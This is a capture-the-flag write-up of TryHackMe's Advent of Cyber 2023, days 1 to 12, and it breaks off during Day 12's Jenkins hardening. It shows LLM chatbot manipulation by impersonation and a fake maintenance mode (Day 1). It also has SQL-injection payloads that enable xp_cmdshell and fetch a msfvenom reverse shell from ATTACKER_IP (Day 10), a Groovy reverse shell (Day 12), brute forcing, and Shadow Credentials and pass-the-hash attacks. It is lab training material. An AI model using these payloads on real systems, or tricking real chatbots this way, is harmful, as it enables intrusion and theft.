# Advent of Cyber 2023

## Overview

Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

Room link: https://tryhackme.com/room/adventofcyber2023

![Advent of Cyber 2023 - Storyboard](/images/aoc2023_storyboard.png)

### The Story

The holidays are near, and all is well at Best Festival Company. Following last year's Bandit Yeti incident, Santa's security team applied themselves to improving the company's security. The effort has paid off! It's been a busy year for the entire company, not just the security team. We join Best Festival Company's elves at an exciting time – the deal just came through for the acquisition of AntarctiCrafts, Best Festival Company's biggest competitor!

Founded a few years back by a fellow elf, Tracy McGreedy, AntarctiCrafts made some waves in the toy-making industry with its cutting-edge, climate-friendly technology. Unfortunately, bad decisions led to financial trouble, and McGreedy was forced to sell his company to Santa.

With access to the new, exciting technology, Best Festival Company's toy systems are being upgraded to the new standard. The process involves all the toy manufacturing pipelines, so making sure there's no disruption is absolutely critical. Any successful sabotage could result in a complete disaster for Best Festival Company, and the holidays would be ruined!

McSkidy, Santa's Chief Information Security Officer, didn't need to hear it twice. She gathered her team, hopped on the fastest sleigh available, and travelled to the other end of the globe to visit AntarctiCrafts' main factory at the South Pole. They were welcomed by a huge snowstorm, which drowned out even the light of the long polar day. As soon as the team stepped inside, they saw the blinding lights of the most advanced toy factory in the world!

Unfortunately, not everything was perfect – a quick look around the server rooms and the IT department revealed many signs of trouble. Outdated systems, non-existent security infrastructure, poor coding practices – you name it!

While all this was happening, something even more sinister was brewing in the shadows. An anonymous tip was made to Detective Frost'eau from the Cyber Police with information that Tracy McGreedy, now demoted to regional manager, was planning to sabotage the merger using insider threats, malware, and hired hackers! Frost'eau knew what to do; after all, McSkidy is famous for handling situations like this. When he visited her office to let her know about the situation, McSkidy didn't hesitate. She called her team and made a plan to expose McGreedy and help Frost'eau prove the former CTO's guilt.

Can you help McSkidy manage audits and infrastructure tasks while fending off multiple insider threats? Will you be able to find all the traps laid by McGreedy? Or will McGreedy sabotage the merger and the holidays with it? Come back on 1st December to find out!

## Day 1 - Chatbot, tell me, if you're really safe?

Opening the provided website, we are shown a ChatGPT-style prompt. Playing around with some prompts, we can confirm that the language processing does not filter out sensitive information.

For example, we can ask for **McGreedy's personal email address**:

![Advent of Cyber 2023 Day 1 - McGreedy Email](/images/aoc2023d1_mcgreedy_email.png)

```
t.mcgreedy@antacticrafts.thm
```

Pivoting to the trying to retrieve the password for the server room door, we see that there is some security checks involved when we supply a prompt:

![Advent of Cyber 2023 Day 1 - Security Check](/images/aoc2023d1_security_check.png)

We can bypass this by asking for the members of the IT department and impersonate them to retrieve the **server room password**:

![Advent of Cyber 2023 Day 1 - IT Department](/images/aoc2023d1_it_dept.png)

```
Van Developer, v.developer@antarcticrafts.thm
```

![Advent of Cyber 2023 Day 1 - Server Door Password](/images/aoc2023d1_server_door_password.png)

```
BtY2S02
```

For **McGreedy's secret project**, we are given a similar response preventing us from simply viewing it. This is an interceptor which is used to check for malicious input before sending them to the chatbot:

![Advent of Cyber 2023 Day 1 - Interceptor](/images/aoc2023d1_interceptor.png)

Similarly, we can bypass this "interceptor" layer by tricking the bot into thinking it is in maintenance mode:

![Advent of Cyber 2023 Day 1 - Purple Snow](/images/aoc2023d1_purple_snow.png)

```
Purple Snow
```

## Day 2 - O Data, All Ye Faithful

Opening the `ipynb` file within Jupyter notebooks shows we are importing a network capture in the form of a CSV file, using [Python Pandas](https://pandas.pydata.org/) to convert it to a dataframe:

![Advent of Cyber Day 2 - Required Code](/images/aoc2023d2_required_code.png)

To retrieve the **number of packets** captured, we can use the following code:

```python
packet_count = df.count()['PacketNumber']
print(f'Number of packets captured: {packet_count}')
```

![Advent of Cyber 2023 Day 2 - Packets Captured](/images/aoc2023d2_packets_captured.png)

```
100
```

We can find the IP sending the **most packets** with the following snippet:

```python
top_ip = df.groupby(['Source']).size().sort_values(ascending=False).head(1)
print(top_ip)
```

![Advent of Cyber 2023 Day 2 - Top IP](/images/aoc2023d2_top_ip.png)

Finally, looking at the **top protocol**, we see that ICMP was observed 27 times:

```python
top_protocol = df['Protocol'].value_counts().head(1)
print(top_protocol)
```

![Advent of Cyber 2023 Day 2 - Top Protocol](/images/aoc2023d2_top_protocol.png)

## Day 3 - Hydra is Coming to Town

Opening the site on port 8000, we are presented with a PIN pad:

![Advent of Cyber Day 3 - PIN Pad](aoc2023d3_pin_pad.png)

Trying the input, we see the pad can only display a maximum of three digits:

![Advent of Cyber Day 3 - Three Digits](/images/aoc2023d3_three_digits.png)

In terms of possibilities, we have 12 possible inputs for each digit. This gives us a total of 4096 possible passwords. We can generate a list of three-digit passwords with `crunch`:

```console
$ crunch 3 3 0123456789ABCDEF -o three_digit_codes.txt
```

![Advent of Cyber 2023 Day 3 - Crunch](/images/aoc2023d3_crunch.png)

Before we bruteforce the PIN, we need to understand more about how the website operates. Looking at the source code, we see:

- The method is `post`
- The URL is `http://<VICTIM_IP>:8000/login.php`
- The PIN code value is sent with the name `pin`

![Advent of Cyber Day 3 - Source Code](/images/aoc2023d3_source_code.png)

In addition, when we input an incorrect PIN, we get an `Access denied` error:

![Advent of Cyber 2023 Day 3 - Access Denied](/images/aoc2023d3_access_denied.png)

Using this information, we can craft our `hydra` command:

```console
$ hydra -l '' -P three_digit_codes.txt -f <VICTIM_IP> http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

To summarise, the above:

- `-l ''`: No username (blank)
- `-P three_digit_codes.txt`: |The password file to use
- `-f`: Stop after finding the password
- `<VICTIM_IP>`: IP address of target
- `http-post-form` Use `HTTP POST` requests
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php`: The page where the form is submitted
    - `pin=^PASS^`: Replaces `^PASS` with values from the  password list
    - `Access denied`: The error produced by the page if an incorrect code is submitted
- `-s 8000`: The port number on the target

Running this will give us the PIN:

![Advent of Cyber 2023 Day 3 - Hydra](/images/aoc2023d3_hydra.png)

Inputting the PIN grants us access:

![Advent of Cyber 2023 Day 3 - Access Granted](/images/aoc2023d3_access_granted.png)

Unlocking the door gives us the flag:

![Advent of Cyber 2023 Day 3 - Flag](/images/aoc2023d3_flag.png)

## Day 4 - Baby, it's CeWLd outside

Opening the target site displays the following homepage:

![Advent of Cyber 2023 Day 4 - Homepage](/images/aoc2023d4_homepage.png)

Navigating to `/login.php`, we see a generic login form:

![Advent of Cyber 2023 Day 4 - Login Form](/images/aoc2023d4_login_form.png)

Submitting invalid credentials produces a `Please enter the correct credentials` error:

![Advent of Cyber 2023 Day 4 - Login Error](/images/aoc2023d4_login_error.png)

Using `cewl`, we can generate a wordlist based on the content of AntarctiCrafts:

```console
$ cewl -d 2 -m 5 -w passwords.lst http://<VICTIM_IP> --with-numbers
```

Similarly, we can generate a wordlist of potential usernames using the content of `team.php`:

```console
$ cewl -d 0 -m 5 -w usernames.lst http://<VICTIM_IP>/team.php --lowercase
```

Now, we can bruteforce the login with `wfuzz`:

```console
$ wfuzz -c -z file,usernames.lst -z file,passwords.lst --hs "Please enter the correct credentials" -u http://<VICTIM_IP>/login.php -d "username=FUZZ&password=FUZ2Z"
```

To summarise, the above:

- `-z file,usernames.lst`: uses the list of generated usernames
- `-z file,passwords.lst`: uses the list of generated passwords
- `--hs "Please enter the correct credentials"`: hides the responses with the given error code
- `-u`: set the target URL
- `-d "username=FUZZ&password=FUZ2Z"`: provides the `HTTP POST` data

This ultimately produces the correct `username:password` combination:

![Advent of Cyber 2023 Day 4 - Credentials](/images/aoc2023d4_credentials.png)

Using the credential combination `isaias:Happiness`, we can login and retrieve the flag:

![Advent of Cyber 2023 Day 4 - Flag](/images/aoc2023d4_flag.png)

## Day 5 - A Christmas DOScovery: Tapes of Yule-tide Past

Connecting to the machine and opening the `DosBox-X` emulator:

![Advent of Cyber 2023 Day 5 - DosBox-X](/images/aoc2023d5_dosbox.png)

Running `dir`, we see we are given a few directories, a `AC2023.BAK` file of **12,704 bytes** and a `PLAN.TXT` file:

![Advent of Cyber 2023 Day 5 - Dir](/images/aoc2023d5_dir.png)

Viewing the contents of `PLAN.TXT` with `TYPE`, we can see the name of the backup file is **BackupMaster 3000**. We also see that the first few bytes of the target file's signature should be `AC` or `41 43`.

![Advent of Cyber 2023 Day 5 - PLAN.TXT](/images/aoc2023d5_plan_txt.png)

Our goal here is to restore the `AC2023.BAK` file using `BUMASTER.EXE` found in `C:\TOOLS\BACKUP`. To do this, we can run the following, however this will result in an error relating to the file signature:

```console
[AC] C:\> BUMASTER.EXE C:\AC2023.BAK
```

![Advent of Cyber 2023 Day 5 - Error](/images/aoc2023d5_error.png)

From the troubleshooting guide, the first few bytes of the file must be `AC` or `41 43`. 

Running `EDIT` on the `AC2023.BAK` file, we see that `XX` is given as the first bytes. Changing this to `AC` and using `ALT+F` to save and quit, we can now run the backup application again with the corrected file:

![Advent of Cyber 2023 Day 5 - XX](/images/aoc2023d5_xx.png)

This returns us the flag:

![Advent of Cyber 2023 Day 5 - Flag](/images/aoc2023d5_flag.png)

## Day 6 - Memories of Christmas Past

Opening `https://<VICTIM_IP>.p.thmlabs.com`, we are greeted with Tree Builder 2023:

![Advent of Cyber 2023 Day 6 - Tree Builder](/images/aoc2023d6_tree_builder.png)

From here, our objective is to buy the star from Van Frosty as well as any number of ornaments to decorate the tree.

However, a bug has been observed in the game where once you obtain 13 coins and ask Van Holly to change your name to `scroogerocks!`, you obtain 33 coins. We can reproduce this as follows:

![Advent of Cyber 2023 Day 6 - Scrooge Rocks!](/images/aoc2023d6_scroogerocks.png)

![Advent of Cyber 2023 Day 6 - Bug Reproduced](/images/aoc2023d6_bug_reproduced.png)

Accessing the debug panel with `TAB`, we see that we have overflowed the buffer assigned to the `player_name` variable into the memory for the `coins` variable:

![Advent of Cyber 2023 Day 6 - Debug Panel](/images/aoc2023d6_debug_panel.png)

Looking at the hex debug panel, we see that `0x21` represents the `!` which is `33` when translated to decimal. Overall, this means that 12 bytes are assigned to store the contents of `player_name` and 4 bytes to store the value of `coins`.

For example, if we set our name to `aaaabbbbccccd`, the final letter `d` will overflow into the space for the `coins` and give us `100` coins:

![Advent of Cyber 2023 Day 6 - Further Testing](/images/aoc2023d6_further_testing.png)

![Advent of Cyber 2023 Day 6 - 100 Coins](/images/aoc2023d6_100_coins.png)

Now that we've confirmed we can control the number of coins we have, we can answer the questions for the room.

Firstly, if the value for `player_name` was `41414141 42424242 43434343` and `coins` was set to `4f 4f 50 53` in memory, we would have a total of `1397772111` coins with the following name:

```
AAAABBBBCCCCOOPS
```

This gives us enough coins to buy the star and get the flag using the `d` ID. However, when we attempt to purchase the flag from the shopkeeper, he sees that we've cheated and produces this message:

![Advent of Cyber 2023 Day 6 - Cheating](/images/aoc2023d6_cheating.png)

Fortunately, not only can we control the memory contents of `coins`, but we can also overwrite the contents of `shopk_name` and `namer_name` to reach `inv_items` and give us the star.

To craft our payload, we need our original overflow length of 16, plus an extra 28 bytes to reach the `inv_items` section. From our previous shopping experience, we know the star is assigned the letter `d`, so we can put that at the end of the payload to assign our star.

Overall, our payload should look something like this:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
```

This will give us the star which we can use to decorate the tree and get the flag:

![Advent of Cyber 2023 Day 6 - Star](/images/aoc2023d6_star.png)

![Advent of Cyber 2023 Day 6 - Decorated Tree](/images/aoc2023d6_decorated_tree.png)

![Advent of Cyber 2023 Day 6 - Flag](/images/aoc2023d6_flag.png)

## Day 7 - 'Tis the season for log chopping

From observations, it is known that Tracy McGreedy has installed a CrypTOYminer malware from the dark web which allows them to exfiltrate sensitive data from the network.

To pinpoint this activity, we are given an `access.log` file comprising proxy logs.

![Advent of Cyber 2023 Day 7 - Log File](/images/aoc2023d7_log_file.png)

The Squid proxy logs are formatted, as such:

```
timestamp - source_ip - domain:port - http_method - http_uri - status_code - response_size - user_agent
```

First we are asked to view the number of **unique IP addresses** connected to the proxy server. To get this, we look for the source IP - field 2 in `access.log`. We do this with the following command:

```console
# Print list of unique IP addresses connected to the proxy server
$ cut -d " " -f2 access.log | sort | uniq

# Print number of unique IP addresses connected to the proxy server
$ cut -d " " -f2 access.log | sort | uniq | wc -l
```

![Advent of Cyber 2023 Day 7 - Unique IPs](/images/aoc2023d7_unique_ips.png)

Next, we are asked to look at the number of **unique domains** that were accessed by the workstations.  To do this, we focus on field 3 in `access.log`, the `domain:port` field:

```console
# Print list of unique domains accessed by all workstations
$ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq

# Print number of unique domains accessed by all workstations
$ cut -d " " -f3 access.log | cut -d ":" -f1 |  sort | uniq | wc -l
```

![Advent of Cyber 2023 Day 7 - Unique Domains](/images/aoc2023d7_unique_domains.png)


```console
# Print least accessed domain
$ cut -d " " -f3 access.log | cut -d ":" -f1 |  sort | uniq -c | sort | head -n 1

# Prnt status code in relation to the least accessed domain
$ grep <LEAST_ACCESSED_DOMAIN> access.log | cut -d " " -f6 | uniq
```

On the other hand, looking at the high connection counts, we see that malicious domain has `1581` detected HTTP requests:

```console
# Print top 10 most accessed domains
$ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq -c | sort -r | head
```

![Advent of Cyber 2023 Day 7 - Malicious Domain](/images/aoc2023d7_malicious_domain.png)

Using the malicious domain from the above command, we can find the IP address of the workstation which accessed it:

```console
# Print IP address of the workstation that accessed the malicious domain
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f2 | uniq
```

As this domain was used as exfiltration, we should pivot on the `http_uri` to see what data was being transmitted:

```console
# Print HTTP_URI field of the requests made to the malicious domain
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5
```

![Advent of Cyber 2023 Day 7 - Exfiltrated Data](/images/aoc2023d7_exfiltrated_data.png)

From the above, we can see that `HTTP GET` requests are being made to the malicious domain and using the `goodies` parameter to transmit data as Base64.

Filtering this output further so that we only get the value of `goodies`, we can decode the data and retrieve the flag:

```console
# Filter exfiltration traffic to malicious domain, decode the trasmitted data and search for the flag
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5 | cut -d "=" -f2 | base64 -d | grep "THM{" | cut -d "," -f3
```

![Advent of Cyber 2023 Day 7 - Flag](/images/aoc2023d7_flag.png)

## Day 8 - Have a Holly, Jolly Byte!

Tracy McGreedy, now a disgruntled regional manager since the merger has complete, has attempted to disrupt operations with the help of Van Sprinkles. However, Van Sprinkles has given a tip to McSkidy of McGreedy's devious plan!

Within the VM, we are supplied a forensic image of an infected USB which was dropped by Van Sprinkles in the employee parking lot.

Typically, during a forensic investigation, such a drive would be connected to a write blocker, which in turn is attached to a forensic analysis workstation. This prevents any possibility of data tampering during analysis.

Using FTK Imager and the USB mapped into `\\PHYSICALDRIVE2`, we can attach this as evidence via **File->Add Evidence Item**, select **Physical Drive**, and then choose the mounted drive:

![Advent of Cyber 2023 Day 8 - Add Evidence Item](/images/aoc2023d8_add_evidence_item.png)

![Advent of Cyber 2023 Day 8 - Physical Drive](/images/aoc2023d8_physical_drive.png)

From the file structure, we see a **deleted** `DO_NOT_OPEN` directory containing numerous suspicious files. Of these files, we have `secretchat.txt` which contains a chat log between `Gr33dYsH4d0W` and `V4nd4LmUffL3r5`.

![Advent of Cyber 2023 Day 8 - secretchat.txt](/images/aoc2023d8_secretchat_txt.png)

Within this chat, there is reference to the **malware C2 server**, `mcgreedysecretc2.thm`, configured by `Gr33dYsH4d0W`:

![Advent of Cyber 2023 Day 8 - C2 Server](/images/aoc2023d8_c2_server.png)

Pivoting to the deleted `JuicyTomaTOY.zip` file, we find an embedded `JuicyTomaTOY.exe` file:

![Advent of Cyber 2023 Day 8 - Deleted Zip](/images/aoc2023d8_deleted_zip.png)

Pivoting back to the root of the USB, we note two deleted PNG files. Using `CTRL+F` to search the contents of these files, we can find a flag within `portait.png`:

![Advent of Cyber 2023 Day 8 - Flag](/images/aoc2023d8_flag.png)

Finally, we can obtain the SHA1 file hash of the disk image through **File->Verify Drive/Image**:

![Advent of Cyber 2023 Day 8 - Verify](/images/aoc2023d8_verify.png)

Once complete, this will produce the MD5 and **SHA1** hash of the filesystem:

![Advent of Cyber 2023 Day 8 - SHA1](/images/aoc2023d8_sha1.png)

## Day 9 - She sells C# shells by the C2shore

In the previous task, we obtained a sample of the `JuicyTomaTOY.exe` malware which allows McGreedy to control elves remotely. We can use DnSpy to analyse the file to see what its intended behaviour is and if we can extract any Indicators of Compromise (IoCs).

In terms of .NET compiled binaries like `JuicyTomaTOY.exe`, the language that is used to create the binary is not translated directly to machine code, like C/C++. Instead, an Intermediate Language (IL) is used to translate it into machine code during runtime via a Common Language Runtime (CLR) environment.

For our purposes, this means that the binary can be decompiled to its (near) source code by reconstructing the metadata contained within the intermediate language.

Opening the file in DnSpy, we are presented with the `Main` program:

![Advent of Cyber 2023 Day 9 - Main](/images/aoc2023d9_main.png)

There are various functions defined within this program that are listed under `Program @02000002`.

Firstly, there are two functions which interact with an external URI, `http://mcgreedysecretc2.thm`, namely `GetIt` and `PostIt`. Both functions utilise the following `User-Agent` string for its connection requests and use either `HTTP GET` or `HTTP POST` requests, respectively:

```
Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
```

Relating this back to the flow of the program, we can see that `http://mcgreedysecretc2.thm/reg` is the first URL used by the malware:

![Advent of Cyber 2023 Day 9 - First URL](/images/aoc2023d9_first_url.png)

There are also two functions which utilise AES for encryption and decryption - `Encryptor` and `Decryptor`. Analysing the file shows that the key is hardcoded:

![Advent of Cyber 2023 Day 9 - Key](/images/aoc2023d9_key.png)

The `Sleeper` function makes a call to `Thread.Sleep` using the integer `count` which is set to the value `15000` (milliseconds) - **15 seconds**.

Again, looking at the flow of the program, we can see the malware accepts commands in order to interact with an infected host.  For example, the `shell` command is used to execute commands via `cmd.exe`:

![Advent of Cyber 2023 Day 9 - Shell Command](/images/aoc2023d9_shell_command.png)

Looking further at the command functionality, if the `implant` command is supplied, the `stash.mcgreedy.thm` domain is used to download a supplementary binary, `spykit.exe`:

![Advent of Cyber 2023 Day 9 - Implant Functionality](/images/aoc2023d9_implant_functionality.png)

## Day 10 - Inject the Halls with EXEC Queries

Today, the Best Festival Company has confirmed that the company website, `bestfestival.thm` has been defaced, causing substantial reputational damage. Most significantly, the web development team are unable to access the web server as the credentials have been changed by the threat actors. 

During their initial investigation, Elf Forensic McBlue discovered a forum post made on a black hat hacking forum by a someone by the alias `Gr33dstr`, stating they were in the possession of multiple vulnerabilities affecting the Best Festival Company. Given the context of the website's defacement, they suspect a possible SQL injection vulnerability.

Navigating to the website, we are greeted with the defaced Best Festival Company homepage:

![Advent of Cyber 2023 Day 10 - Defaced Homepage](/images/aoc2023d10_defaced_homepage.png)

Manually crawling the website, we come across an input form allowing us to search the site for gifts:

![Advent of Cyber 2023 Day 10 - Start Search](/images/aoc2023d10_start_search.png)

![Advent of Cyber 2023 Day 10 - Input Form](/images/aoc2023d10_input_form.png)

From the above form, we can input information about three main attributes: `age`, `interests`, and `budget`. Filling the form with arbitrary information and submitting redirects us to a results page with our parameters populated within the URL:

![Advent of Cyber 2023 Day 10 - URL Parameters](/images/aoc2023d10_url_params.png)

So, we can hypothesise that the underlying PHP code which handles the form takes three parameters, specifically `age`, `interests`, and `budget` and performs a query against the database to retrieve the filtered results which is then outputted to the page via `giftresults.php`.

To test if this functionality is vulnerable, we can place a single quote (`'`) as one of the parameter values and submit the form. This results in the following error:

![Advent of Cyber 2023 Day 10 - Form Error](/images/aoc2023d10_form_error.png)

Based on this, we can attempt to visualise what the backend PHP looks like:

```php
// Retrieve form inputs from URL
$age = $_GET['age'];
$interests = $_GET['interests'];
$budget = $_GET['budget'];

// Form query from the supplied values
$query = "SELECT name FROM gifts WHERE age='$age' AND interests='$interests' AND budget<'$budget'";

// Connect to database and execute query
$result = sqlsrv_query($conn, $query);
```

As such, we can utilise the `' OR 1=1 --`payload to retrieve all gifts. Scrolling to the bottom of the results, we get the first flag:

![Advent of Cyber 2023 Day 10 - First Flag](/images/aoc2023d10_first_flag.png)

Now that we can successfully exploit this vulnerability, we can attempt to get a shell on the system. From our initial testing, we discovered that the system is running a **Microsoft SQL Server**. Within this software is a stored procedure called [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) which spawns a Windows command shell and can be manually enabled with the SQL `EXECUTE`, or `EXEC`, command.

Firstly, we need to enable some advanced configuration options within the SQL server. We do this by injecting the following payload into one of the variables:

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

From here, we can generate a reverse shell via `msfvenom`. This can be accomplished as follows:

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o reverse_shell.exe
```

This will create a `reverse_shell.exe` file using the payload `windows/x64/shell_reverse_tcp` and setting the host / port to our attacker machine.

With our payload generated, we need to upload it to the web server. To do this, we will use the Python HTTP server on our attacker machine and `certutil` within our SQLi payload:

```console
# Attacker machine
$ sudo python3 -m http.server <PORT>
```

```
'; EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/reverse_shell.exe C:\Windows\Temp\reverse_shell.exe'; --
```

Finally, we need to actually run the reverse shell and catch the callback with Netcat. To do this, set up a Netcat listener on your chosen port with `nc -nvlp <PORT>` and use the following payload:

```
'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse_shell.exe'; --
```

![Advent of Cyber 2023 Day 10 - Netcat Callback](/images/aoc2023d10_netcat_callback.png)

Searching through the system, we see we have a `Administrator` user with suspicious files in their `Desktop` directory:

![Advent of Cyber 2023 Day 10 - Admin Desktop](/images/aoc2023d10_admin_desktop.png)

Looking at `Note.txt`, we can see this is instructions for how to run the `deface_website.bat` script but also the `restore_website.bat` script:

![Advent of Cyber 2023 Day 10 - Note.txt](/images/aoc2023d10_note_txt.png)

Running the `restore_website.bat` file shows that our final flag is on `index.php`:

![Advent of Cyber 2023 Day 10 - Restore Website](/images/aoc2023d10_restore_website.png)

![Advent of Cyber 2023 Day 10 - Final Flag](/images/aoc2023d10_final_flag.png)

## Day 11 - Jingle Bells, Shadow Spells

As AntarctiCrafts' technology is highly specialised, appropriate security posture was an afterthought. With the progression of infrastructure and underlying systems, more vulnerabilities have been discovered, but not addressed as the team is quite small.

AntarctiCrafts adopts Windows Active Directory (AD), a system widely used in enterprise systems to centralise resources and authentication. At the heart of this lies a Domain Controller (DC) which carries out the management of data storage, authentication, and authorisation across the domain.

For proper security practice, an ideal configuration would adopt the Principle of Least Privilege (PoLP) and the use of a hierarchical approach when assigning permissions to users. Incorrect or improper use of these policies, such as granting a user higher privilege than their role requires, could potentially compromise the entire domain.

In addition, to replace password authentication, Windows also introduced Windows Hello for Business (WHfB), which uses cryptographic keys for user verification that are connected to a known PIN (or biometrics) which is known to the user. The Domain Controller utilises the `msDS-KeyCredentialLink` attribute to store the public key in WHfB.

![Advent of Cyber 2023 Day 11 - Windows Hello](/images/aoc2023d11_windows_hello.png)

To store a new set, or pair, of certificates in WHfB:

1) The Trusted Platform Module (TPM) creates a public-private key pair for the user's account. The private key never leaves the TPM and is never disclosed to the user.
2) The client requests a certificate to receive a trustworthy certificate from the organisation's certificate issuing authority (CA)
3) Finally, the user's `msDS-KeyCredentialLink` attribute is set

To authenticate:

1) The Domain Controller decrypts the client's pre-authentication data using the public key stored in the `msDS-KeyCredentialLink` attribute
2) The Domain Controller then generates a certificate which is sent back to the client
3) The client can now log into the Active Directory domain with this certificate

![Advent of Cyber 2023 Day 11 - WHfB Authentication Procedure](/images/aoc2023d11_whfb_auth_procedure.png)

From our provided system, we can enumerate for security misconfigurations in these systems with the `PowerView.ps1` script on the `hr` user's `Desktop`. We first have to load the script into memory and also bypass the default PowerShell script execution policy in order to properly execute commands:

![Advent of Cyber 2023 Day 11 - PowerView Load](/images/aoc2023d11_powerview_load.png)

First, we will enumerate our current user's privileges:

```powershell
PS > Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

![Advent of Cyber 2023 Day 11 - User Privileges](/images/aoc2023d11_user_privileges.png)

From the above output, we can see the `hr` user has the `GenericWrite` permission over the `vansprinkles` object. As such, we can compromise this account with that privilege by updating the `msDS-KeyCredentialLink` attribute - this is known as a **Shadow Credentials** attack.

To exploit this vulnerability, we can use `Whisker.exe` which will simulate the creation of a device, therefore updating the `msDS-KeyCredentialLink` attribute:

```powershell
PS > .\Whisker.exe add /target:vansprinkles
```

![Advent of Cyber 2023 Day 11 - Whisker](/images/aoc2023d11_whisker.png)

This gives us the ability to impersonate the vulnerable user via `Rubeus.exe`. Overall, we are carrying out a **pass-the-hash** attack. With our valid certificate we have obtained, we can acquire a valid TGT (Ticket Granting Ticket) and impersonate the user.

```powershell
PS > Rubeus.exe asktgt /user:vansprinkles /certificate:<CERTIFICATE> /password:"Aq9Y4X8IbcFXiVVP" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

![Advent of Cyber 2023 Day 11 - TGT](/images/aoc2023d11_tgt.png)

From the above, we have successfully obtained a TGT for the `vansprinkles` user. As such, we can now carry out a **pass-the-hash** attack via `evil-winrm`, the username and NTLM hash, as follows:

```console
$ evil-winrm -i 10.10.196.229 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
```

![Advent of Cyber 2023 Day 11 - Evil-WinRM](/images/aoc2023d11_evil_winrm.png)

We can now retrieve the file on the `Administrator` user's `Desktop`:

```powershell
PS > Get-ChildItem C:\Users\Administrator\Desktop
PS > Get-Content C:\Users\Administrator\Desktop\flag.txt
```

![Advent of Cyber 2023 Day 11 - Flag](/images/aoc2023d11_flag.png)

## Day 12 - Sleighing Threats, One Layer at a Time

Due to the recent merger, the company's security posture has reduced dramatically and lacks a clear strategy. McHoneyBell proposes Defence In Depth to secure every layer and aspect of the environment.

Navigating to `http://<VICTIM_IP>:8080`, we are shown a Jenkins dashboard:

![Advent of Cyber 2023 Day 12 - Jenkins Dashboard](/images/aoc2023d12_jenkins_dashboard.png)

Clicking on **Manage Jenkins** on the left navigation bar and scrolling down, we can utilise **Script Console** to run arbitrary code on the system:

![Advent of Cyber 2023 Day 12 - Script Console](/images/aoc2023d12_script_console.png)

![Advent of Cyber 2023 Day 12 - Groovy Console](/images/aoc2023d12_groovy_console.png)

This console utilises [Apache Groovy](https://www.groovy-lang.org/), a powerful language commonly utilised in developer / devops environments for enhancing productivity. We can therefore craft a [reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) and gain access to the host:

```groovy
String host="<ATTACKER_IP>";
int port=<PORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```console
# Attacker machine
$ nc -nvlp <PORT>
```

![Advent of Cyber 2023 Day 12 - Netcat Callback](/images/aoc2023d12_nc_callback.png)

From executing the above, we get a callback on our `nc` listener as the `jenkins` user.

Exploring the system, we find a `backup.sh` file within `/opt/scripts` which contains credentials to the `tracy` user:

![Advent of Cyber 2023 - Backup.sh](/images/aoc2023d12_backup_sh.png)

Looking at the script, we see that it performs a backup of the Jenkins data and compresses it into a `tar.gz` archive before transferring it via SSH using the `tracy` user's credentials.

This means that we can authenticate as `tracy` via SSH:

![Advent of Cyber 2023 Day 12 - Tracy SSH](/images/aoc2023d12_tracy_ssh.png)

From here, we can run `sudo -l` to check what commands the `tracy` user can run using `sudo`:

![Advent of Cyber 2023 Day 12 - Sudo -l](/images/aoc2023d12_sudo_l.png)

We can see that the user can perform any command, allowing us to run `sudo su` and escalate our privileges to `root` and read the `/root/flag.txt` file:

```console
$ sudo su
```

![Advent of Cyber 2023 Day 12 - sudo su](/images/aoc2023d12_sudo_su.png)

![Advent of Cyber 2023 Day 12 - Flag](/images/aoc2023d12_flag.png)

Now that we have successfully compromised this system, lets implement some fixes to prevent this from happening in future. Firstly, we can remove `tracy` from the `sudo` group, preventing them from using `sudo`:

```console
# Delete user from sudo group
$ sudo deluser tracy sudo

# Confirm deletion
$ sudo -l -U tracy
```

![Advent of Cyber 2023 Day 12 - Remove Tracy Sudo](/images/aoc2023d12_remove_tracy_sudo.png)

Authenticating as `tracy` and attempting to run `sudo -l`, we get the following error:

![Advent of Cyber 2023 Day 12 - sudo -l error](/images/aoc2023d12_sudo_l_error.png)

Now, lets harden the SSH configuration on the host. Editing the `/etc/ssh/sshd_config` file, we can reconfigure it so that password authentication is disabled - simply removing the `#` and changing `yes` to `no` on the line that reads `#PasswordAuthentication yes`:

![Advent of Cyber 2023 Day 12 - Disable Password Authentication](/images/aoc2023d12_disable_password_auth.png)

Similarly, we can change the line that says `Include /etc/ssh/sshd_config/*.conf` and add a `#` at the start. Finally, we can save the file and restart the SSH service:

```console
$ sudo systemctl restart ssh
```

Now, when attempting to authenticate as `tracy` using the password, we are denied due to the lack of key-based authentication:

![Advent of Cyber 2023 Day 12 - SSH Error](/images/aoc2023d12_ssh_error.png)

Finally, let's secure our Jenkins instance. To do this, we can navigate to `/var/lib/jenkins`. We see that there are two config files, `config.xml` and `config.xml.bak`:

